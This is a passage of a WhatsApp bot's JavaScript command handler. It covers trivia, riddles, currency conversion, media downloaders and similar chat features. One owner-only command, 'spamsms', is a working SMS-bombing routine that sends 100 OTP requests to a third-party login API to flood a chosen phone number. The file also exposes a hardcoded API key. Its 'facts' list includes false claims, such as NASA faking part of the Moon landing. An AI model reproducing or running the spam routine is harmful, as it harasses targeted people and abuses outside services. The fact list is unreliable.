        "Animals can experience time differently from humans. 🐾⏳",
        "Water might not be wet. 💧❓",
        "A chicken once lived for 18 months without a head. 🐔⚰️",
        "All the world’s bacteria stacked on top of each other would stretch for 10 billion light-years. 🦠🌌",
        "Wearing a tie can reduce blood flow to the brain by 7.5 percent. 👔🧠",
        "Our solar system has a wall. 🪐🧱",
        "Mount Everest isn't the tallest mountain on Earth. ⛰️🌏",
        "Octopuses don’t actually have tentacles. 🐙🤔",
        "Most maps of the world are wrong. 🗺️❌",
        "NASA genuinely faked part of the Moon landing. 🌕🚀",
        "Comets smell like rotten eggs. ☄️💩",
        "Earth’s poles are moving. 🌍🧭",
        "You can actually die laughing. 😂💀",
        "Chainsaws were first invented for childbirth. 🪚👶",
        "Ants don’t have lungs. 🐜💨",
        "Wind turbines kill between 10,000 and 100,000 birds each year in the UK. 🌬️🦅",
        "Snails have teeth. 🐌🦷",
        "Your signature could reveal personality traits. 🖋️🧠",
        "Bananas are radioactive. 🍌☢️",
        "There’s no such thing as a straight line. ➖❓",
        "Deaf people are known to use sign language in their sleep. 💤🤟",
        "Finland is the happiest country on Earth. 🇫🇮😄",
        "The Moon looks upside down in the Southern Hemisphere. 🌕🔄",
        "Bacteria on your skin cause your itches. 🦠🤔",
        "Starfish don’t have bodies. 🌟❌🧍‍♂️",
        "Somebody has been constipated for 45 days. 💩⏳",
        "You travel 2.5 million km a day around the Sun without realizing. 🌞🚀",
        "Fish form orderly queues in emergencies. 🐟🚶‍♂️",
        "There are more bacterial cells in your body than human cells. 🦠🧍‍♂️",
        "The world record for donut eating is held by John Haight, who ate 29 donuts (52 ounces) in a little over six minutes. 🍩⏱️",
        "Corn Flakes were invented after Will Keith Kellogg and his brother Dr. John Harvey Kellogg set about developing a nutritious cereal for the patients of a health resort in 1890. 🌽🥣",
        "Every square inch of the human body has about 19,000,000 skin cells. 👤🦠",
        "The trunk of an elephant can hold up to two gallons of water. 🐘💧",
        // Additional facts with emojis
        "Wombat poop is cube-shaped. 🐾🔲",
        "Sharks existed before trees. 🦈🌳",
        "Cleopatra lived closer in time to the moon landing than to the building of the Great Pyramid. 🏛️🌑",
        "The Eiffel Tower can be 15 cm taller during the summer. 🗼☀️",
        "Some cats are allergic to humans. 🐱🤧",
        "A single strand of spider silk is stronger than steel. 🕷️🧵",
        "Sloths can hold their breath longer than dolphins. 🦥💨",
        "A blue whale’s tongue weighs as much as an elephant. 🐋🐘",
        "Polar bear skin is black. 🐻‍❄️⚫",
        "A cloud can weigh more than a million pounds. ☁️💨",
        "Elephants are the only animals that can’t jump. 🐘❌",
        "The longest hiccuping spree lasted 68 years. 😲🥴",
        "Venus is the hottest planet in our solar system, not Mercury. ♀️🔥",
        "Bananas are berries, but strawberries aren't. 🍌🍓",
        "Cows have best friends and get stressed when separated. 🐄❤️",
        "The shortest commercial flight in the world lasts just 57 seconds. ✈️⏱️",
        "The average person walks the equivalent of three times around the world in a lifetime. 🌍👟",
        "The first recorded use of the word 'hello' was in 1827. 👋📚",
        "There are more fake flamingos in the world than real ones. 🦩🎉",
        "In Japan, there are more pets than children. 🐾👶",
        "A day on Mercury lasts 1,440 hours, but its year is only 88 days. ☿️⏳",
        "Your body contains around 100,000 miles of blood vessels. 💉🫀",
        "There is a species of jellyfish that is biologically immortal. 🦑♾️",
        "Some turtles can breathe through their butts. 🐢🍑",
        "The longest hiccuping spree lasted 68 years. 🥴⏳",
        "The world’s largest desert isn’t the Sahara – it’s Antarctica. 🏜️❄️",
        "The human nose can distinguish at least 1 trillion different scents. 👃🌸",
        "A snail can sleep for three years. 🐌💤",
        "The first recorded use of the word 'hello' was in 1827. 👋📜",
        "The longest time between two twins being born is 87 days. 👶👶⏳",
        "A crocodile cannot stick its tongue out. 🐊👅❌",
        "The longest word in the English language is 189,819 letters long. 📝😱",
        "A 'jiffy' is an actual unit of time — it's 1/100th of a second. ⏱️⚡",
        "Butterflies taste with their feet. 🦋👣",
        "The Great Wall of China is not visible from space without aid. 🏯🌌",
        "A sneeze can travel at 100 miles per hour. 🤧💨",
        "The human body contains around 37.2 trillion cells. 🧬🧍‍♂️",
        "An octopus has three hearts. 🐙💓💓💓",
        "The world’s oldest living animal is a tortoise named Jonathan, born in 1832. 🐢🎂",
        "The shortest commercial flight lasts just 57 seconds. ✈️⏱️",
        "Humans and giraffes have the same number of neck vertebrae. 🦒🦴",
        "There's a volcano in Indonesia that is known to 'sing.' 🌋🎶",
        "There are more lifeforms living on your skin than there are people on Earth. 🧑‍🤝‍🧑🦠",
        "A starfish can regrow its arms. 🌟💪",
        "A shrimp’s heart is located in its head. 🦐💓",
        "Bananas are actually berries, but strawberries aren’t. 🍌🍓",
        "A kangaroo can’t walk backward. 🦘🚶‍♂️❌",
        "Tigers have striped skin, not just striped fur. 🐅🖤",
        "The inventor of the Pringles can is buried in one. 🍟⚰️",
        "Polar bear skin is black. 🐻‍❄️⚫",
        "You blink about 15-20 times per minute. 👀💫",
        "Bananas are radioactive. 🍌☢️",
        "The longest hiccuping spree lasted 68 years. 😲⏳",
        "A group of owls is called a parliament. 🦉🏛️",
        "You can’t hum while holding your nose. 👃🎶❌"
    ];
    reply(facts[Math.floor(Math.random() * facts.length)]);
    break;
    
case 'tts': {
  if (!text) return reply(`*Example :*\n> *.tts what is your name?*`)
  const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
  const b = Buffer.from(a.audioUrl)
  ThugBotInc.sendMessage(m.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break     
case 'listcurrency':
    axios.get('https://api.exchangerate-api.com/v4/latest/USD')
        .then(response => {
            const currencies = Object.keys(response.data.rates);
            const currencyList = currencies.join(', ');
            reply(`*Supported Currencies:*\n${currencyList}`);
        })
        .catch(() => reply('*Could not retrieve the list of currencies. Please try again later.*'));
    break;


case 'convert':
    if (!text) {
        return reply('*Example: .convert 100 USD EUR*');
    }
    if (args.length < 3) {
        return reply(`*Usage: ${prefix}convert [amount] [from currency] [to currency]*\n*Example: ${convert} 100 USD NGN*`);
    }

    const amount = parseFloat(args[0]);
    if (isNaN(amount)) {
        return reply('*Please provide a valid number for the amount.*');
    }

    const fromCurrency = args[1] ? args[1].toUpperCase() : null;
    const toCurrency = args[2] ? args[2].toUpperCase() : null;

    if (!fromCurrency || !toCurrency) {
        return reply(`*Please provide valid currency codes*\n*Type ${prefix}listcurrency to see our available currencies.`);
    }

    axios.get(`https://api.exchangerate-api.com/v4/latest/${fromCurrency}`)
        .then(response => {
            const rate = response.data.rates[toCurrency];
            if (!rate) {
                return reply('*Invalid currency code.*');
            }
            const convertedAmount = (amount * rate).toFixed(2);
            reply(`${amount} ${fromCurrency} = ${convertedAmount} ${toCurrency}`);
        })
        .catch(() => reply('*Could not retrieve exchange rate data. Please try again.*'));
    break;

case 'remindme':
case 'reminder':
    if (!text) {
        return reply(`*Example: ${prefix}reminder 5, (reason)*\n*Note: Time (5) is in minutes*`);
    }
    const timee = parseInt(args[0]); // time in minutes
    const reminder = args.slice(1).join(' ');


    setTimeout(() => {
        reply(reminder);
    }, timee * 60 * 1000);

    reply(`*Reminder set for ${timee} minute(s).*`);
    break;

case 'repost': {
    if (!ThugTheCreator) return reply(mess.owner)
    try {
        let mediaType;
        
        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return reply('*Reply to a Video, Image, or Audio Status*');
        }

        var mediaFile = await ThugBotInc.downloadAndSaveMediaMessage(quoted);
        let messageOptions = {
            caption: q ? q : ''
        };

        // Assign the correct media type to messageOptions
        messageOptions[mediaType] = {
            url: mediaFile
        };

        // Send to status@broadcast (broadcast to all statuses)
        await ThugBotInc.sendMessage('status@broadcast', messageOptions, { statusJidList: Object.keys(global.db.data.users) });
        await reply('*Media reposted successfully*');
        
    } catch (error) {
        console.error(error);
        reply('*Failed to repost the media.*');
    }
    break;

}   
case 'wouldyourather': {
    let wouldYouRather = [
        "Would you rather always have to sing when you speak or dance everywhere you go? 🎤💃",
        "Would you rather have the ability to fly but only at walking speed, or be able to teleport but only to places you've been before? 🦸‍♂️✈️",
        "Would you rather never be able to use the internet again or never be able to watch TV again? 📱📺",
        "Would you rather be invisible for one day or be able to read minds for one day? 🕵️‍♂️👻",
        "Would you rather live forever or live a normal life but with extraordinary wealth? 💸🏝️",
        "Would you rather have a rewind button or a pause button on your life? ⏮️⏸️",
        "Would you rather be able to talk to animals or speak every human language? 🐶🌍",
        "Would you rather never age or never get sick? 👶💪",
        "Would you rather fight a bear or a lion with just a stick? 🦁🐻",
        "Would you rather always have free Wi-Fi wherever you go or have free coffee where/whenever you want? ☕📶",
        "Would you rather have the ability to breathe underwater or fly through the sky? 🐠✈️",
        "Would you rather fight a thousand chickens or one tiger? 🐔🐯",
        "Would you rather be a superhero or a supervillain? 🦸‍♂️🦹‍♂️",
        "Would you rather be able to see the future or change the past? 🔮⏳",
        "Would you rather have dinner with your favorite celebrity or with your best friend? 🍽️👫",
        "Would you rather be able to eat anything you want without gaining weight or never need sleep? 🍕💤",
        "Would you rather have a pet dragon or a pet unicorn? 🐉🦄",
        "Would you rather have the ability to speak to animals or be able to read minds? 🦜🤯",
        "Would you rather only be able to walk on your hands or only be able to walk backwards? 🤸‍♀️🚶‍♂️",
        "Would you rather live in a world with no technology or no books? 📚📵",
        "Would you rather always have to wear socks or always have to wear gloves? 🧦🧤",
        "Would you rather be able to control fire or water? 🔥💧",
        "Would you rather be a master of every instrument or a master of every language? 🎸🎶",
        "Would you rather have the ability to speak any language or play any instrument? 🎤🎹",
        "Would you rather be really rich but never find love, or be poor but have a soulmate? 💵❤️",
        "Would you rather have free food for life or free travel for life? 🍔✈️",
        "Would you rather be able to teleport anywhere or be able to time travel? ⏳🛸",
        "Would you rather be incredibly strong or incredibly fast? 💪🏃‍♂️",
        "Would you rather fight zombies or aliens? 🧟‍♂️👽",
        "Would you rather live in a castle or in a spaceship? 🏰🚀",
        "Would you rather have a magic carpet or a flying car? 🧞‍♂️🚗",
        "Would you rather have unlimited money or unlimited time? 💸⏰",
        "Would you rather be able to breathe underwater or fly in the sky? 🌊✈️",
        "Would you rather win the lottery or be famous? 💰🎥",
        "Would you rather travel to the past or to the future? 🕰️🔮",
        "Would you rather only eat pizza for the rest of your life or only eat burgers? 🍕🍔",
        "Would you rather have the power of invisibility or super strength? 👻💪",
        "Would you rather live in a world without music or without movies? 🎶🎬",
        "Would you rather have to dance everywhere you go or sing everywhere you go? 💃🎤",
        "Would you rather never need to sleep or never need to eat? 🛌🍴",
        "Would you rather be a famous actor or a famous musician? 🎥🎶",
        "Would you rather always know what time it is or always know where you are? ⏰🌍",
        "Would you rather be able to control time or read minds? ⏳🤯",
        "Would you rather be able to speak every language in the world or have the ability to communicate with animals? 🌍🐾",
        "Would you rather be the best at every sport or the best at every game? ⚽🎮",
        "Would you rather live in a world where everyone is always honest or everyone is always kind? 💬💖",
        "Would you rather have a lifetime supply of free shoes or free books? 👠📚",
        "Would you rather live without your phone or without your computer? 📱💻",
        "Would you rather get stuck in an elevator with your crush or with your worst enemy? 🏢😱",
        "Would you rather be a vampire or a werewolf? 🧛‍♂️🐺",
        "Would you rather be really good at cooking or really good at cleaning? 🍳🧽",
        "Would you rather explore space or the ocean? 🚀🌊",
        "Would you rather have a rewind button or a fast forward button? ⏪⏩",
        "Would you rather be able to control your dreams or remember every dream vividly? 💭🛏️",
        "Would you rather have to always tell the truth or always lie? 🤥🗣️",
        "Would you rather live in the city or in the countryside? 🏙️🌳",
        "Would you rather have an unlimited supply of coffee or chocolate? 🍫☕",
        "Would you rather always know what people are thinking or always know what people are going to do? 🧠🔮",
        "Would you rather be able to fly or be able to teleport anywhere instantly? 🦅🛸",
        "Would you rather always have your favorite music playing or always have your favorite food available? 🎶🍔",
        "Would you rather be able to communicate with aliens or time travelers? 👽⏳",
        "Would you rather never be able to tell a lie or never hear a lie? 🤥🗣️",
        "Would you rather never have to sleep or never have to eat? 🛌🍽️",
        "Would you rather fight a giant spider or a swarm of bees? 🕷️🐝",
        "Would you rather only be able to walk on your hands or only be able to walk backwards? 🤸‍♂️🚶‍♀️",
        "Would you rather never get tired or never get bored? 😴🤔",
        "Would you rather live on a tropical island or in a snowy mountain cabin? 🏖️🏔️",
        "Would you rather live without music or without books? 📚🎶",
        "Would you rather be extremely smart or extremely good-looking? 🧠💁‍♂️",
        "Would you rather have the ability to fly but only at night or have super strength but only in the daytime? 🌙☀️",
        "Would you rather get lost in a city or in the woods? 🌆🌲",
        "Would you rather be able to turn invisible or be able to talk to animals? 👻🐾",
        "Would you rather always have perfect weather or always have perfect food? 🌞🍽️",
        "Would you rather be able to remember every dream you ever had or never dream again? 🛏️💭",
        "Would you rather be able to control the weather or have the ability to time travel? ⛈️⏳",
        "Would you rather always be able to make people laugh or always make people cry? 😂😢",
        "Would you rather be stuck in a room with no windows or stuck in a room with no doors? 🚪🪟",
        "Would you rather never need to sleep or never need to eat? 🛏️🍔",
        "Would you rather never be able to lie or always tell the truth? 🤥🗣️",
        "Would you rather live in space or live underwater? 🌌🌊",
        "Would you rather have free travel around the world or free food for life? ✈️🍔"
    ];

    let kah = wouldYouRather[Math.floor(Math.random() * wouldYouRather.length)];
    await reply(kah);
}
break;
case 'riddle': {
    let riddles = [
        "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I? 🌬️",
        "The more of this there is, the less you see. What is it? 👀",
        "I’m tall when I’m young, and I’m short when I’m old. What am I? 🕯️",
        "What has keys but can’t open locks? 🎹",
        "What has a heart that doesn’t beat? 💖",
        "What comes once in a minute, twice in a moment, but never in a thousand years? ⏳",
        "What has a head, a tail, but no body? 🪙",
        "What can travel around the world while staying in the corner? 🌍📮",
        "What gets wetter as it dries? 🧴",
        "I am not alive, but I grow; I don’t have lungs, but I need air; I don’t have a mouth, and I can drown. What am I? 🔥",
        "What is full of holes but still holds a lot of weight? 🧀",
        "I’m light as a feather, yet the strongest man can’t hold me for much longer. What am I? 💨",
        "What is so fragile that saying its name breaks it? 💔",
        "What has one eye but can’t see? 👁️",
        "What has a neck but no head? 👚",
        "What runs but never walks, has a bed but never sleeps? 💧",
        "What can you catch but not throw? 🤧",
        "What comes down but never goes up? 🌧️",
        "What has cities, but no houses; forests, but no trees; and rivers, but no water? 🗺️",
        "What belongs to you, but others use it more than you do? 👚",
        "What is always in front of you but can’t be seen? 👀",
        "What is at the end of a rainbow? 🌈",
        "What has legs but doesn’t walk? 🦀",
        "I have keys but open no locks. I have space but no room. You can enter, but you can’t go inside. What am I? ⌨️",
        "What has many teeth but can’t bite? 🧤",
        "What has four fingers but isn’t alive? 🖐️",
        "What is black when you buy it, red when you use it, and gray when you throw it away? 🔥",
        "What kind of room has no doors or windows? 🌑",
        "What is something you can hold in your left hand but not your right? ✋",
        "What has a face and two hands but no arms or legs? 🕰️",
        "What can’t be used until it’s broken? 🥚",
        "I’m tall when I’m young, and I’m short when I’m old. What am I? 🕯️",
        "What has a bed but never sleeps? 🛏️",
        "What is always coming but never arrives? ⏰",
        "What starts with an E, ends with an E, but only has one letter? ✉️",
        "What has a tail but no body? 🐍",
        "What has an eye but can’t see? 👁️",
        "What has a head, a tail, but no body? 🪙",
        "What goes up but never comes down? 🎈",
        "What can be cracked, made, told, and played? 🧩",
        "What has a thumb and four fingers but is not alive? 🧤",
        "What starts with P, ends with E, and has thousands of letters? 📬",
        "What has no beginning, no end, and is always in the middle? 💍",
        "I am taken from a mine, and shut up in a wooden case, from which I am never released, and yet I am used by almost every person. What am I? ✏️",
        "What can’t be seen but can make you feel cold? ❄️",
        "What can be heard but not seen? 🎧",
        "What comes up but never goes down? 🎈",
        "What runs but never gets tired? ⏳",
        "What has keys but can't open locks? 🎹",
        "What gets bigger the more you take away? 🕳️",
        "What word is spelled incorrectly in every dictionary? 📚",
        "I have hands but I can’t clap. What am I? ⏰",
        "What is always hungry but never eats? 🔥",
        "What gets sharper the more you use it? ✍️",
        "What has a ring but no finger? 📱",
        "What can you break, even if you never pick it up or touch it? 💔",
        "What comes once in a minute, twice in a moment, but never in a thousand years? ⏳",
        "What is made of water but can never get wet? 🌊",
        "What has a mouth but doesn’t speak? 🏞️",
        "What gets bigger the more you take away from it? 🕳️",
        "What has a heart that doesn’t beat? 💖",
        "What can you hold without touching it? 💭",
        "What has many rings but no fingers? 📱",
        "What always runs but never moves? 🧭",
        "What is something you can’t see but is always in front of you? 💭",
        "What is full of holes but still holds water? 🧽",
        "What has hands but can’t clap? ⏰",
        "What goes up and down but does not move? ⬆️⬇️",
        "What starts with T, ends with T, and has T in it? 🍵",
        "What flies without wings? 🕊️",
        "What comes down but never goes up? 🌧️",
        "What has keys but can’t open locks? 🎹",
        "What has a neck but no head? 🍷",
        "What has an eye but can’t see? 🧵",
        "What has legs but doesn’t walk? 🦑",
        "What has one eye but can’t see? 🧵",
        "What is always in front of you but can’t be seen? 👀",
        "What is bigger than a skyscraper but weighs nothing? 💨",
        "What has no beginning, no end, and is always in the middle? 🌀",
        "What is black and white and red all over? 📰",
        "What can travel around the world while staying in the corner? 🧳",
        "What has a face but no eyes? 🕰️",
        "What comes once in a year, twice in a month, but never in a day? 🌍",
        "What is light as a feather, yet the strongest man can’t hold it for much longer? 💨",
        "What has four legs but can’t walk? 🛋️",
        "What is harder to catch the faster you run? 🎯",
        "What gets bigger the more you take away? 🕳️",
        "What has a foot but no legs? 🦶",
        "What has a bark but no bite? 🌳",
        "What has a thumb and four fingers but is not alive? 🧤",
        "What has no body and can run? 💨",
        "What has no beginning, no end, and is always in the middle? 🧭",
        "What is a room that has no doors or windows? 🌑",
        "What has a bed but never sleeps? 🛏️"
    ];
    let riddle = riddles[Math.floor(Math.random() * riddles.length)];
    await reply(riddle);
}
break;
case 'survival': {
    let scenarios = [
        "You're lost in the desert with no water. What do you do? 🏜️",
        "A wild bear is staring at you in the forest. What’s your move? 🐻",
        "Your boat capsized in the middle of the ocean. How do you survive? 🌊",
        "You're trapped in a cave during a thunderstorm. What's your plan? ⛈️",
        "An earthquake just hit, and you're indoors. What’s your action? 🌍",
        "A zombie outbreak has started in your city. What's your first move? 🧟",
        "You're stranded on an island with no food. What will you do? 🏝️",
        "You wake up in a locked room with no idea how you got there. What now? 🚪",
        "A tornado is heading your way. How do you stay safe? 🌪️",
        "You're being chased by a pack of wolves in the snow. What’s your strategy? 🐺",
        "You're stuck in quicksand! What’s your survival move? 🏞️",
        "You're lost in a dense jungle at night. How do you proceed? 🌲",
        "A sudden tsunami is approaching! What do you do? 🌊",
        "Your plane is crashing. How do you brace for impact? ✈️",
        "You're inside a burning building. How do you escape? 🔥",
        "A venomous snake just bit you. What’s your next move? 🐍",
        "You're on a sinking ship in the middle of the ocean. What’s your plan? 🚢",
        "You wake up in the middle of a warzone. How do you survive? 💣",
        "You're trapped in an elevator with no signal. What’s your plan? 🏢",
        "You're stranded in the Arctic with no supplies. What do you do? ❄️",
        "A serial killer is stalking you in an abandoned house. What's your move? 🔪",
        "You see a massive asteroid approaching Earth. How do you react? ☄️",
        "A rabid dog is running toward you aggressively. What do you do? 🐶",
        "You're hiking and suddenly fall into a deep pit. How do you escape? 🕳️",
        "A giant wave is coming towards your beachside home. What now? 🌊",
        "You get lost while exploring an ancient underground ruin. How do you get out? 🏛️",
        "You're stuck in a collapsed building after an explosion. How do you stay alive? 🏚️",
        "A mysterious fog surrounds your town, and people start disappearing. What do you do? 🌫️",
        "You're trapped in an abandoned asylum, and the doors are locked. What’s your next step? 🏥",
        "A group of bandits are raiding your village. How do you react? ⚔️"
    ];

    let actions = [
        "Look for a cactus 🌵", "Conserve energy and wait 🌞", "Try to dig for water 🏖️", "Walk towards the sun 🌞",
        "Stay still and wait 🛑", "Slowly move away 🐾", "Scare it with a loud noise 🔊", "Run for safety 🚶‍♂️💨",
        "Climb a tree 🌳", "Seek higher ground 🏔️", "Swim towards land 🌊", "Find shelter in a cave 🏞️",
        "Build a fire 🔥", "Try to signal for help 🚨", "Look for an escape route 🚪", "Use your GPS if available 📱",
        "Ration your food and water 🥤", "Stay calm and conserve energy 🧘‍♂️", "Follow the river downstream 🌊",
        "Brace for impact 💺", "Drop to the ground and cover your head 🧑‍⚕️", "Try to dig yourself out 🏔️",
        "Stay low to avoid smoke inhalation 🌫️", "Find edible plants 🌿", "Trust the pilot 🛫",
        "Make a weapon for defense 🪓", "Run in a zigzag pattern 🏃‍♂️", "Find a safe hiding spot 🏕️",
        "Use a map to navigate 🗺️", "Wait for rescue ⏳", "Call for help 📞", "Play dead to avoid detection 🏴",
        "Use a mirror to signal for help 🪞", "Collect rainwater for drinking 🌧️", "Find shelter fast 🏠",
        "Use vines to climb to safety 🌿", "Look for animal tracks to find water 🐾", "Stay quiet and move stealthily 🤫",
        "Use a piece of cloth as a makeshift bandage 🩹", "Swim parallel to the shore to escape rip currents 🌊",
        "Dig a trench to protect against strong winds 🏜️", "Find and purify water before drinking 💧",
        "Use a rock to break a locked door 🔨", "Find an old map or notes for clues 📜",
        "Use tree sap as an adhesive for repairs 🌲", "Follow the stars to navigate at night ⭐",
        "Cover yourself in mud to avoid mosquito bites 🦟", "Construct a raft using fallen logs 🚣",
        "Break a piece of glass to cut through restraints 🔪", "Stay in the center of a collapsed structure for stability 🏚️",
        "Use your shoelaces to make a rope 🥾", "Find high ground to escape flooding 🌊",
        "Crawl low to avoid smoke inhalation 🔥", "Distract predators with loud noise 📣",
        "Use reflections from metal to attract attention 🪙", "Forage for berries but avoid bright-colored ones 🍇",
        "Set traps to catch small animals for food 🪤", "Use your shirt as a makeshift air filter 🧣",
        "Use the sun's position to determine direction ☀️", "Tear fabric to make bandages 🩹",
        "Find a floating object to cling onto in water 🛟", "Wedge an object into a door to keep it shut 🚪",
        "Use oil or grease to slip out of tight spaces 🛢️", "Break open an emergency exit with force 🚨",
        "Try to pick the lock using a hairpin or wire 🔑", "Use Morse code to tap for help 🎙️",
        "Turn off all lights to remain unnoticed in a house 🌑", "Find a weapon and prepare to defend yourself ⚔️",
        "Gather a group for strength in numbers 👫", "Bury yourself in leaves for warmth 🍂",
        "Tie tree branches together to form a makeshift raft 🌿", "Keep moving to prevent hypothermia ❄️",
        "Use animal dung to track herds for water sources 🐾", "Create a smoke signal with a controlled fire 🔥",
        "Construct a spear for defense and hunting 🏹", "Use duct tape to secure wounds and tools 🩹",
        "Search the wreckage for useful supplies 🔍", "Avoid panic and focus on breathing techniques 🧘"
    ];

    let randomScenario = scenarios[Math.floor(Math.random() * scenarios.length)];
    let randomAction = actions[Math.floor(Math.random() * actions.length)];

    return reply(`🦁 *Survival Challenge:* ${randomScenario}\n💡 *Your Survival Action:* ${randomAction}`);
}
break;
case 'lyrics': {
    if (!args[0] || args.join(" ").trim() === '') return reply("*Provide a song name*");

    await ThugBotInc.sendMessage(m?.chat, { react: { text: `🎼`, key: m?.key } });
    reply('*Searching...*');

    try {
        const query = encodeURIComponent(args.join(" "));
        const res = await fetch(`https://api.nexoracle.com/search/lyrics?apikey=ac53d2249a60050114&q=${query}`);

        if (!res.ok) {
            const errorText = await res.text();  // Handle cases where API doesn't return JSON
            throw new Error(`*Failed to fetch lyrics: ${errorText}*`);
        }

        const json = await res.json();
        const { lyrics } = json;
        if (!lyrics) throw new Error("*Lyrics not found*");

        const hehz = `*🎶 𝙻𝚈𝚁𝙸𝙲𝚂 🎶*\n\n*${lyrics}*`;
        reply(hehz);
    } catch (error) {
        reply(`*Error:* ${error.message}`);
    }
}
break;



case 'spamsms': {
if (!ThugTheCreator) return reply(mess.owner)
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('0')) return reply('*Start the number with +234*')
if (froms == owner) return reply('*Cannot spam this number!*')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY HW MODS WA MODS`);
});
}
} else reply(`*Use of spamsms target number/reply message*\n*Example of spamsms +234xxx*`)
reply(`*Spam sms/call will be sent to target number*`)
}
break 
case 'fb':
case 'facebook': 
case 'aio':
case 'ig':
case 'tiktok':
case 'tt':
case 'instagram': {
    await loading();
    
    if (!text) {
        return reply(`*Where's the link?*\n\n*Example:* ${prefix + command} <video link>*`);
    }
    
    await ThugBotInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });

    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/download/aio?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data.success) {
            const { title, low_quality, high_quality } = response.data.video;

            const isDirectDownloadHD = high_quality.includes("tinyurl");

            if (isDirectDownloadHD) {
                await ThugBotInc.sendMessage(m.chat, {
                    video: { url: high_quality },
                    mimetype: 'video/mp4',
                    fileName: `${title}_HD.mp4`,
                    caption: `🎥 *Title:* ${title}\n*Quality:* HD\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™`
                }, { quoted: m });
            } else {
                await ThugBotInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });

                const hdBuffer = await axios.get(high_quality, { responseType: 'arraybuffer' });

                await ThugBotInc.sendMessage(m.chat, {
                    video: Buffer.from(hdBuffer.data),
                    mimetype: 'video/mp4',
                    fileName: `${title}_HD.mp4`,
                    caption: `🎥 *Title:* ${title}\n*Quality:* HD\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™`
                }, { quoted: m });
            }
        } else {
            reply("*Unable to fetch the video. Please check the URL and try again.*");
        }
    } catch (error) {
        console.error('Error in AIO Downloader:', error.message);
        reply("*An error occurred while processing your request. Please try again later.*");
    }
    break;
}

case "gemini": {
    if (!text) return reply("What do you want to ask me?");
    
    try {
        let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + encodeURIComponent(text));
        reply(data.text);
    } catch (error) {
        console.error("Error fetching Gemini response:", error.message);
        reply("An error occurred while processing your request.");
    }
}
break;

case 'tinyurl':{
   if(!q) return reply('*Provide a link you would like to shorten*')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function 
  (error, response, body) {
   try {
  reply(body)
  } catch (e) {
  reply(e)
  }
  })
  }
 break           
case 'gimage': case "ai-search":{
if (!text) return reply(`Example : ${prefix + command} Dogs`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let n = result
let images = n[Math.floor(Math.random() * n.length)].url
ThugBotInc.sendMessage(m.chat, { image: { url: images}, caption: `${text}`}, { quoted:fsaluran })
})
}
break
case "diffusion": 
